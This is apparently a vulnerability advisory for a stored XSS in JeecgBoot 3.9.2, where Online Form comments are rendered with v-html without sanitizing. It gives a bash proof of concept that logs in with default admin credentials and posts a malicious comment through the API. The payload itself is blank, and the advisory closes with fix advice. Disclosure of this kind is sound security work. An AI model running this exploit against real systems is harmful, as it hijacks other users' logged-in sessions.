### Affected versions JeecgBoot 3.9.2 ### Summary A stored XSS vulnerability exists in the comment list on the right side of the Online Form edit/detail popup in JeecgBoot. After comment content is written to `sys_comment.comment_content` through `/sys/comment/addText`, when a user opens the corresponding form record again, the frontend retrieves the comment list through `/sys/comment/listByForm` and renders the comment body using `v-html`. Since the comment content is not effectively HTML-escaped or filtered with an allowlist during either storage or display, malicious HTML submitted by an attacker will be executed by the browser when the comment area is loaded. ### Details The Online Form edit/detail popup passes the current record’s `tableName` and `dataId` to the comment panel, and the comment component then calls `/sys/comment/listByForm` to load the comment list for the corresponding record. The issue occurs at the comment body rendering point. `CommentList.vue:45` directly outputs `item.commentContent` using `v-html`: ```vue
``` `getHtml()` is only used for emoji replacement and does not sanitize HTML tags, event attributes, or other executable content. When the backend `/sys/comment/addText` saves a comment, it also does not filter `commentContent`. During query, the content is returned from `sys_comment.comment_content` to the frontend as-is. Therefore, an attacker only needs to submit a comment body containing an HTML event attribute, and the content will be rendered as HTML and executed when the comment list is loaded. ### PoC Payload: ```html ``` Write a malicious comment through the API: ```bash BASE='http://localhost:35631/jeecgboot' TOKEN=$(curl -sS -X POST "$BASE/sys/mLogin" \ -H 'Content-Type: application/json' \ --data '{"username":"admin","password":"123456"}' | jq -r '.result.token') COMMENT_ID=$(curl -sS -X POST "$BASE/sys/comment/addText" \ -H "X-Access-Token: $TOKEN" \ -H 'X-Tenant-Id: 1000' \ -H 'Content-Type: application/json' \ --data '{ "tableName":"test_note", "tableDataId":"2049047805615423489", "fromUserId":"e9ca23d68d884d4ebb19d07889727dae", "commentContent":"" }' | jq -r '.result') ``` Browser trigger path: after logging in to the backend, go to `Low-Code Development` -> `Online Form Development` -> find `test_note / Leave Request Form@JS Enhancement Example` -> click `More` -> `Function Test` -> on the `AUTO Online Form` page, find the record where `Username = ceshi,zhangsan` -> click `Edit` or `Details` -> after the `Comments` tab on the right side of the popup loads the comment body containing ``, the browser pops up `comment-body-xss`. During verification, the popup was triggered twice because the frontend loaded the comment list twice. ### Impact A user with comment permission can write a malicious comment under an Online Form record. Afterwards, any user who has permission to view the comment area of that record only needs to open the edit or detail popup and load the comment list, and the malicious script will execute in that user’s current logged-in session. The trigger condition for this issue is relatively low. The user does not need to click the comment content or hover over a specific element; normal rendering of the comment list is enough to trigger it. Since the malicious content is persistently stored in `sys_comment.comment_content`, it will continue to affect subsequent users who view the record until the comment is deleted or the issue is fixed. After script execution, the attacker can use the victim’s logged-in session to read form data on the page, interfere with business operations, or initiate same-origin requests. ### Suggested Fix It is recommended to first modify the comment body rendering method at `CommentList.vue:45`. If the comment body does not need to support rich text, avoid using `v-html` and render it as plain text instead: ```vue
{{ item.commentContent || '' }}
.comment-content-text { white-space: pre-wrap; word-break: break-word; } ``` Also avoid using `lineFeed()` to replace line breaks with `
` and then passing the result to `v-html`. Line break display can be handled with the CSS property `white-space: pre-wrap`. If the business logic does require the comment body to support some rich text, introduce reliable HTML allowlist sanitization either before frontend rendering or before backend storage. Only safe tags and safe attributes should be allowed, and executable content such as event attributes and `javascript:` URLs should be prohibited.
